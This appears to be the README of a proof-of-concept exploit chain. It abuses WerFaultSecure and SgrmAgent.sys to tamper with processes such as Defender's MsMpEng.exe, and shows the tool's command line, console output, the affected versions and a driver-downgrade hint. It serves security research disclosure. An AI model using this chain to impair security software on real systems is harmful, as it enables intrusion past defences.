# SgrmFault - Process Tampering Exploit Chain
SgrmFault revives a COM-based code injection in `WerFaultSecure` to abuse a process tampering feature exposed by `SgrmAgent.sys`. **The research was presented at REcon 2026 and DEF CON 34 under the title "Chaining Microsoft Binaries to Achieve Privileged Primitives in the Windows Kernel"**.

```
C:\Users\test\Desktop>SgrmFault.exe -p 2640 -t "MsMpEng.exe"
*******************************************************************************
*       WerFaultSecure & SgrmAgent.sys Process Impairment Chain
*       Exploit chain presented at --> DEF CON 34 <--
*       Presentation: {link to be updated}
*       GitHub: https://www.github.com/lem0nSec/SgrmNightmare
*       Angelo Frasca Caccia (lem0nSec_) & Alejandro Pinna (frodosobon)
*******************************************************************************

[+] SeDebugPrivilege ok
[+] SGRM Shellcode of size 1824 ready at 0x000002C157B0C260
[+] Section object created: 0x1f0
[+] Section mapped in local process: 0x000002C157D00000
[+] AppContainer process: 2640
[+] Random GUID generated: 9e9e80a7-d7b8-49ce-8c16-da00021cb925
[+] Opened inheritable handle to AppContainer process: 0x1f4
[+] Section object is now inheritable.
[+] Spawned WerFaultSecure: 6208 - Waiting for overlapped result...
[+] Oplock fired! Dumping WerFaultSecure.exe...
[+] IRundown parameters collected.
[+] Remote section identified at 0x000001F3CF690000
[+] IRundown connection successful: 0x000002C159790228
[+] DoCallback 1.
[+] Sample _CONTEXT saved:
        RIP: 0x00007FFDA552540E
        RSP: 0x000000C04EFFE3E0
        RBP: 0x000000C04EFFE440
[+] DoCallback 2. Firing shellcode & waiting...
[+] Complete.
```

## Requirements
**The POC runs under the following requirements:**
- Windows 10 or 11 with System Guard Runtime Monitor installed and running
- `SgrmAgent.sys` version 10.0.20348.2849 or lower
Tests have shown that default installations of Windows 10 meet the requirements. Windows 11 comes with SGRM up until 22H2, though the driver is not exploitable. Since SGRM is disabled by default on Windows 11 22H2, the driver can be downgraded, that is, replaced with an older version.

## Why this matters
While the requirements above limit exploitation in newer Windows builds, smart changes to the POC may enable it to run on modern OS builds. This would lead to a 'Next Generation BYOVD' - entirely based on first-party components rather than third-party vulnerable drivers.

## Detection
Lorem Ipsum

## Credits
Lorem Ipsum
